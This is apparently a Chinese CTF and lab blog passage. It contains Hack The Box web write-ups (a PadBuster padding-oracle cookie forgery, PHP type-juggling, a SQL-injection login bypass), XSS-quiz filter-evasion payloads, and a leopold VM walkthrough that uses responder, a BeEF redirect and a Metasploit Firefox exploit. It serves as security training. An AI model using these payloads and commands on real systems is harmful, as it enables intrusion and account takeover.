class="line">[+] Success: (63/256) [Byte 8]</span><br><span class="line">Do you want to use this value (Yes/No/All)? [y/n/a] : y</span><br><span class="line">[+] Success: (150/256) [Byte 7]</span><br><span class="line">Do you want to use this value (Yes/No/All)? [y/n/a] : a</span><br><span class="line">[+] Success: (225/256) [Byte 6]</span><br><span class="line">[+] Success: (154/256) [Byte 5]</span><br><span class="line">[+] Success: (57/256) [Byte 4]</span><br><span class="line">[+] Success: (140/256) [Byte 3]</span><br><span class="line">[+] Success: (185/256) [Byte 2]</span><br><span class="line">[+] Success: (128/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] Cipher Text (HEX): 5ff96bda9a25d7f9</span><br><span class="line">[+] Intermediate Bytes (HEX): 884072c2621c68c0</span><br><span class="line">[+] Plain Text: &#123;&quot;user&quot;:</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, &lt;STDIN&gt; line 4.</span><br><span class="line">*** Starting Block 2 of 4 ***</span><br><span class="line"></span><br><span class="line">[+] Success: (44/256) [Byte 8]</span><br><span class="line">[+] Success: (9/256) [Byte 7]</span><br><span class="line">[+] Success: (184/256) [Byte 6]</span><br><span class="line">[+] Success: (9/256) [Byte 5]</span><br><span class="line">[+] Success: (78/256) [Byte 4]</span><br><span class="line">[+] Success: (247/256) [Byte 3]</span><br><span class="line">[+] Success: (97/256) [Byte 2]</span><br><span class="line">[+] Success: (139/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] Cipher Text (HEX): 054ef73b3398cc72</span><br><span class="line">[+] Intermediate Bytes (HEX): 7d980fb7f34bf5d5</span><br><span class="line">[+] Plain Text: &quot;admin&quot;,</span><br><span class="line"></span><br><span class="line">*** Starting Block 3 of 4 ***</span><br><span class="line"></span><br><span class="line">[+] Success: (175/256) [Byte 8]</span><br><span class="line">[+] Success: (12/256) [Byte 7]</span><br><span class="line">[+] Success: (71/256) [Byte 6]</span><br><span class="line">[+] Success: (174/256) [Byte 5]</span><br><span class="line">[+] Success: (174/256) [Byte 4]</span><br><span class="line">[+] Success: (98/256) [Byte 3]</span><br><span class="line">[+] Success: (197/256) [Byte 2]</span><br><span class="line">[+] Success: (209/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 3 Results:</span><br><span class="line">[+] Cipher Text (HEX): 97a1379951adf98c</span><br><span class="line">[+] Intermediate Bytes (HEX): 273c985756baf650</span><br><span class="line">[+] Plain Text: &quot;role&quot;:&quot;</span><br><span class="line"></span><br><span class="line">*** Starting Block 4 of 4 ***</span><br><span class="line"></span><br><span class="line">[+] Success: (113/256) [Byte 8]</span><br><span class="line">[+] Success: (7/256) [Byte 7]</span><br><span class="line">[+] Success: (45/256) [Byte 6]</span><br><span class="line">[+] Success: (137/256) [Byte 5]</span><br><span class="line">[+] Success: (18/256) [Byte 4]</span><br><span class="line">[+] Success: (172/256) [Byte 3]</span><br><span class="line">[+] Success: (43/256) [Byte 2]</span><br><span class="line">[+] Success: (22/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 4 Results:</span><br><span class="line">[+] Cipher Text (HEX): 41d12ce36fc3308e</span><br><span class="line">[+] Intermediate Bytes (HEX): e2d252eb73d0fb8e</span><br><span class="line">[+] Plain Text: user&quot;&#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (ASCII): &#123;&quot;user&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;user&quot;&#125;</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (HEX): 7B2275736572223A2261646D696E222C22726F6C65223A2275736572227D0202</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (Base64): eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9AgI=</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure></p>
<p>所以将<strong>role</strong>改为<strong>admin</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# padbuster http://docker.hackthebox.eu:42414/profile.php 82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D 8 --cookie &quot;iknowmag1k=82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D;PHPSESSID=qevph0jf0hlskfkr0atq1kj1b3&quot; -plaintext &quot;&#123;\&quot;user\&quot;:\&quot;admin\&quot;,\&quot;role\&quot;:\&quot;admin\&quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N/A</span><br><span class="line">[+] Content Length: 3844</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Encrypt Mode</span><br><span class="line">[+] Number of Blocks: 4</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line"></span><br><span class="line">The following response signatures were returned:</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">ID#	Freq	Status	Length	Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1	1	200	3844	N/A</span><br><span class="line">2 **	255	500	2203	N/A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (97/256) [Byte 8]</span><br><span class="line">[+] Success: (155/256) [Byte 7]</span><br><span class="line">[+] Success: (87/256) [Byte 6]</span><br><span class="line">[+] Success: (153/256) [Byte 5]</span><br><span class="line">[+] Success: (61/256) [Byte 4]</span><br><span class="line">[+] Success: (188/256) [Byte 3]</span><br><span class="line">[+] Success: (151/256) [Byte 2]</span><br><span class="line">[+] Success: (167/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 4 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 300a2faf0d881a9f</span><br><span class="line">[+] Intermediate Bytes (HEX): 516e42c663aa679e</span><br><span class="line"></span><br><span class="line">[+] Success: (197/256) [Byte 8]</span><br><span class="line">[+] Success: (77/256) [Byte 7]</span><br><span class="line">[+] Success: (51/256) [Byte 6]</span><br><span class="line">[+] Success: (253/256) [Byte 5]</span><br><span class="line">[+] Success: (25/256) [Byte 4]</span><br><span class="line">[+] Success: (182/256) [Byte 3]</span><br><span class="line">[+] Success: (226/256) [Byte 2]</span><br><span class="line">[+] Success: (96/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 3 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 8a6b238e62ec8b18</span><br><span class="line">[+] Intermediate Bytes (HEX): a8194ce207ceb13a</span><br><span class="line"></span><br><span class="line">[+] Success: (203/256) [Byte 8]</span><br><span class="line">[+] Success: (77/256) [Byte 7]</span><br><span class="line">[+] Success: (130/256) [Byte 6]</span><br><span class="line">[+] Success: (12/256) [Byte 5]</span><br><span class="line">[+] Success: (6/256) [Byte 4]</span><br><span class="line">ERROR: No matching response on [Byte 3]</span><br><span class="line">       Automatically trying one more time...</span><br><span class="line">ERROR: No matching response on [Byte 8]</span><br><span class="line">Do you want to start this block over? (Yes/No)? [y/n/a] : a</span><br><span class="line">INFO: Switching to interactive mode</span><br><span class="line">[+] Success: (203/256) [Byte 8]</span><br><span class="line">Do you want to use this value (Yes/No/All)? [y/n/a] : a</span><br><span class="line">[+] Success: (77/256) [Byte 7]</span><br><span class="line">ERROR: 500 Can&apos;t connect to docker.hackthebox.eu:42414 (Connection timed out)</span><br><span class="line">   Retrying in 10 seconds...</span><br><span class="line"></span><br><span class="line">[+] Success: (130/256) [Byte 6]</span><br><span class="line">[+] Success: (176/256) [Byte 5]</span><br><span class="line">[+] Success: (129/256) [Byte 4]</span><br><span class="line">[+] Success: (80/256) [Byte 3]</span><br><span class="line">[+] Success: (53/256) [Byte 2]</span><br><span class="line">[+] Success: (14/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] New Cipher Text (HEX): d8add2173d139318</span><br><span class="line">[+] Intermediate Bytes (HEX): faccb67a547db134</span><br><span class="line"></span><br><span class="line">[+] Success: (83/256) [Byte 8]</span><br><span class="line">[+] Success: (107/256) [Byte 7]</span><br><span class="line">[+] Success: (221/256) [Byte 6]</span><br><span class="line">[+] Success: (52/256) [Byte 5]</span><br><span class="line">[+] Success: (219/256) [Byte 4]</span><br><span class="line">[+] Success: (207/256) [Byte 3]</span><br><span class="line">[+] Success: (239/256) [Byte 2]</span><br><span class="line">[+] Success: (161/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 2c344253ad52b596</span><br><span class="line">[+] Intermediate Bytes (HEX): 57163720c82097ac</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D</span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure></p>
<p>更改iknowmag1k，得到flag，跑了3个小时（orz）</p>
<h2 id="grammar"><a href="#grammar" class="headerlink" title="grammar"></a>grammar</h2><p>进入网页，出现403<br><img src="https://i.loli.net/2019/05/16/5cdcc23d6865468602.png" alt=""><br>用burpsuite 截获请求，改用<code>post</code>方式访问<a href="http://docker.hackthebox.eu:50101/index.php" target="_blank" rel="noopener">http://docker.hackthebox.eu:50101/index.php</a><br>得到了一个页面<br><img src="https://i.loli.net/2019/05/16/5cdcc3aa1233896306.png" alt=""><br>查看网页源码，注意到一行注释：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTB hint:really not important...totaly solvable without using it! Just there to fill things and to save you from some trouble you might get into :) --&gt;</span><br></pre></td></tr></table></figure></p>
<p>所以我们去看他的请求信息会有哪些，注意到了<strong>cookie</strong>：<br><img src="https://i.loli.net/2019/05/16/5cdcc4c39a17959432.png" alt=""><br>base64解码之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;User&quot;:&quot;admin&quot;,&quot;Admin&quot;:&quot;False&quot;,&quot;MAC&quot;:&quot;ef7bf3acf4e370f991a6342b4f57dee1&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>有两个地方需要改，<code>Admin</code>和<code>MAC</code>，关键就在于<strong>MAC</strong><br>查看了他人的writeup，发现在<a href="https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf" target="_blank" rel="noopener">https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf</a> 指出了HMAC算法的问题<br><img src="https://i.loli.net/2019/05/16/5cdccefd80f4f86580.png" alt=""><br>因为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(‘aa’==0);</span><br></pre></td></tr></table></figure></p>
<p>的结果是<strong>true</strong>,所以我们尝试构造：<br><img src="https://i.loli.net/2019/05/16/5cdcd15a867b618705.png" alt=""><br>将<strong>cookie</strong>改为上述值，则可到flag</p>
<h2 id="Lernaean"><a href="#Lernaean" class="headerlink" title="Lernaean"></a>Lernaean</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180919184650-507feb54-bbf9-1.png" alt=""></p>
<p>赤裸裸的提示爆破，于是利用burp，字典设为<strong>username</strong>，最终找到flag</p>
<h2 id="Cartographer"><a href="#Cartographer" class="headerlink" title="Cartographer"></a>Cartographer</h2><p>用burp监测到<code>sql inject</code>，并且直接注出了页面（也可以利用万能密码：user：<code>admin&#39;/*</code> pass：<code>密码*/&#39;</code>），但是：</p>
<blockquote>
<p><br>Cartographer<br>Is Still<br>Under Construction!        </p>
</blockquote>
<p>注意到地址栏<code>panel.php?info=home</code>，将其改为flag，则读到了flag</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/tutorial-ctf/">tutorial ctf</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/03/靶机/xss-quiz/"><span>XSS Challenges</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/03/靶机/xss-quiz/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-02T16:26:31.857Z">
          2019-05-03
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="XSS-Challenges"><a href="#XSS-Challenges" class="headerlink" title="XSS Challenges"></a>XSS Challenges</h1><p>平台地址： <a href="https://xss-quiz.int21h.jp" target="_blank" rel="noopener">https://xss-quiz.int21h.jp</a></p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;</span><br></pre></td></tr></table></figure>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>当在search框输入的时候，发现对<code>&lt;</code>和<code>&gt;</code>进行了编码，所以将注意点转入到右边选择框，利用右键检查元素，将<strong>japan</strong>改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>查看源码，发现了一个<strong>hidden</strong>的输入框，查看元素，输入上述exp</p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>查看搜索框，限制了maxlength，将其改为50<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>还是尖括号编码，并且只有一个输入框，很烦，提示是事件处理，找了一下关于<strong>input</strong>的时间处理，找到一个<a href="https://www.runoob.com/jsref/event-oninput.html" target="_blank" rel="noopener">oninput</a>，所以检查元素，然后修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oninput=&quot;javascript:alert(document.domain);&quot;</span><br></pre></td></tr></table></figure></p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>同6相同的方法</p>
<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>要求输入一个url，没有任何处理，于是直接利用伪协议：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain);</span><br></pre></td></tr></table></figure></p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>发现第6是个万能解法<br>方法2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>没过滤尖括号，嘿嘿，过滤了<strong>domain</strong>,用一段js编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str = &apos;document.domain&apos;</span><br><span class="line">output = &apos;&apos;</span><br><span class="line">for(var i = 0;i&lt;str.length;i++)&#123;</span><br><span class="line">	output +=str.charCodeAt(i)+&apos;,&apos;</span><br><span class="line">&#125;</span><br><span class="line">console.log(output)</span><br></pre></td></tr></table></figure></p>
<p>然后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110)))&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p>把<strong>s</strong>转义为<strong>xs</strong>，过滤规则如下</p>
<blockquote>
<p>Hint: “s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;”</p>
</blockquote>
<pre><code>&quot;&gt;&lt;iframe src=&quot;javascr&amp;#09;ipt:alert(document.domain);&quot;&gt;&lt;/iframe&gt;
&quot;&gt;&lt;iframe src=&quot;javas&amp;#99;ript:alert(document.domain);&quot;&gt;&lt;/iframe&gt;
</code></pre><p>但是没地址</p>
<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>地址：<a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=62c192a540aba87e7b6796ce0cbc2cd93fcb0750" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_no012.php?sid=62c192a540aba87e7b6796ce0cbc2cd93fcb0750</a><br>规则：</p>
<blockquote>
<p>“s/[\x00-\x20\&lt;>\”\’]//g;</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``onmouseover=alert(document.domain);</span><br></pre></td></tr></table></figure>
<p>仅在ie上可以</p>
<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>有问题</p>
<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p><strong>注：由于题目有点古老，所以建议使用ie8内核的浏览器</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cos:expres/**/sion(if(!window.x)&#123;alert(document.domain);window.x=1;&#125;)</span><br></pre></td></tr></table></figure></p>
<h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p>由于转义了<code>&lt;&gt;</code>、<code>&quot;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e</span><br></pre></td></tr></table></figure></p>
<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e</span><br></pre></td></tr></table></figure>
<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p>贴他人的wp：</p>
<blockquote>
<p>看答案，这一题似乎较为复杂，和日语编码有关；并且新版本的IE都已经修复了。</p>
<p>提示：multi-byte character</p>
<p>euc-jp的编码范围：</p>
<p>byte 1為8E時, 為2 byte編碼, byte 2範圍為A1-DF</p>
<p>byte 1範圍為A1-FE時, 為2 byte編碼, byte 2範圍為A1-FE</p>
<p>byte 1為8F時為3 byte編碼, byte 2與byte 3範圍均為A1-FE</p>
<p>两个表单元素都提交%A7闭合最后的双引号，查看源码成功了，为什么UI上去没成功？无奈直接在地址栏：javascript:alert(document.domain);</p>
<p>现在发现原来是浏览器版本问题，别用IE8了过这个。</p>
<p>p1=1%A7&amp;p2=+onmouseover%3Dalert%28document.domain%29%3B+%A7</p>
<p>干脆跳过拉倒。</p>
</blockquote>
<h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><p>ie5或者6，再见</p>
<h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p>处理代码是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">//&lt;![CDATA[</span><br><span class="line">(function(g)&#123;var a=location.href.split(&quot;#!&quot;)[1];if(a)&#123;g.location=g.HBR=a.replace(/:/gi,&quot;&quot;);&#125;&#125;)(window);</span><br><span class="line">//]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>有个hint是：</p>
<blockquote>
<p>Twitter DomXss at Sep 24, 2010</p>
</blockquote>
<p>多半是这个：<a href="https://news.softpedia.com/news/Twitter-Messes-Up-XSS-Bug-Fix-Three-Times-157969.shtml" target="_blank" rel="noopener">https://news.softpedia.com/news/Twitter-Messes-Up-XSS-Bug-Fix-Three-Times-157969.shtml</a><br>不过内核问题解决不了<br>预计解决方案：<code>/#!javascript:alert(document.domain);&quot;</code></p>
<p>reference：<br><a href="https://www.codercto.com/a/33998.html" target="_blank" rel="noopener">https://www.codercto.com/a/33998.html</a><br><a href="https://www.cnblogs.com/go2bed/p/4131222.html" target="_blank" rel="noopener">https://www.cnblogs.com/go2bed/p/4131222.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/xss-practice/">xss practice</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/01/靶机/leopold/"><span>leopold 靶机渗透</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/01/靶机/leopold/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-01T15:16:12.624Z">
          2019-05-01
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="SP-leopold-靶机渗透"><a href="#SP-leopold-靶机渗透" class="headerlink" title="SP: leopold 靶机渗透"></a>SP: leopold 靶机渗透</h1><p>描述：</p>
<blockquote>
<p>Flags<br>/root/flag.txt<br>/home/leopold/flag.txt<br>Tested with VirtualBox<br>DHCP<br>Difficulty: Beginner<br>The machines are in the intermediate difficulty range. None of them should be as easy as to just run a msf module to get root right away, if so please let me know. They all have two flags, one for local and one for root access.</p>
<p>Didn’t like to be inported to VMware </p>
</blockquote>
<p>用virtualbox打开，VMware不行<br>因为靶机为桥接模式，所以攻击机也打开桥接模式</p>
<ul>
<li><p>nmap -sP IP-RANGE<br>找到了靶机的地址：</p>
<blockquote>
<p>Nmap scan report for leopold.lan (192.168.199.111)<br>Host is up (0.00034s latency).</p>
</blockquote>
</li>
<li><p>nmap -sS -sV IP -A，得到结果</p>
</li>
</ul>
<blockquote>
<p>PORT    STATE SERVICE     VERSION<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp open  netbios-ssn Samba smbd 3.6.6 (workgroup: WORKGROUP)<br>MAC Address: 08:00:27:62:04:49 (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 2.6.X|3.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3<br>OS details: Linux 2.6.32 - 3.10<br>Network Distance: 1 hop</p>
<p>Host script results:<br>|_clock-skew: mean: -59m55s, deviation: 1h24m51s, median: -1h59m55s<br>|<em>nbstat: NetBIOS name: LEOPOLD, NetBIOS user: <unknown>, NetBIOS MAC: &lt;unknown(unknown)<br>| smb-os-discovery:<br>|   OS: Unix (Samba 3.6.6)<br>|   Computer name: leopold<br>|   NetBIOS computer name:<br>|   Domain name:<br>|   FQDN: leopold<br>|</unknown></em>  System time: 2019-05-01T15:28:17+02:00<br>| smb-security-mode:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge<em>response: supported<br>|</em>  message_signing: disabled (dangerous, but default)<br>|_smb2-time: Protocol negotiation failed (SMB2)</p>
</blockquote>
<ul>
<li><p>注意到samba协议，想起关于samba有很多漏洞，于是试图利用<code>Samba远程命令执行漏洞（CVE-2017-7494）</code>，但是没什么用，太难了！！！</p>
</li>
<li><p>根据reddit上的某大牛的提示才有了眉目</p>
</li>
<li>利用<strong>responder</strong>，对网卡进行监听并指定目标地址，在<code>responder.conf</code>(/usr/share/responder/Responder.conf)  更改如下：</li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea4fcec341630825.png" alt=""></p>
<p><img src="https://i.loli.net/2019/05/26/5cea4ff03467a88106.png" alt=""></p>
<ul>
<li>在files文件下新建一个<code>redirect.html</code>，内容如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; URL=&apos;http://192.168.199.238:3000/demos/basic.html&apos;&quot; /&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>basic.html</code>是<code>beef</code>框架下的一个用于基本漏洞利用</li>
<li>开启<code>beef</code></li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea514d6bbc775894.png" alt=""></p>
<ul>
<li>本地登录<code>127.0.0.1:3000</code>，用户名和密码均为<code>beef</code></li>
<li>然后开启responder：<code>responder --basic -I eth0</code></li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea51d3b837958367.png" alt=""></p>
<ul>
<li>在beef的<code>panel</code>中可以看到：</li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea52100d38c72906.png" alt=""></p>
<ul>
<li><p>于是就可利用msf的<code>firefox_tostring_console_injection</code>模块，该漏洞描述如下：</p>
<blockquote>
<p>This exploit gains remote code execution on Firefox 15-22 by abusing two separate<br>Javascript-related vulnerabilities to ultimately inject malicious Javascript code<br>into a context running with chrome:// privileges.</p>
</blockquote>
</li>
<li><p>直接<code>run -j</code></p>
</li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea539c87da679849.png" alt=""></p>
<ul>
<li>更改<code>redirect.html</code>，将<code>url</code>更改为上述生成的会话：</li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea540ae9c9914518.png" alt=""></p>
<ul>
<li>然后利用<strong>responder</strong>输入<code>responder --basic -I eth0</code>，等一会儿，msf就会自动生成会话：</li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea54b64d65417320.png" alt=""></p>
<ul>
<li>在msf上输入：<code>sessions -i 1</code></li>
</ul>
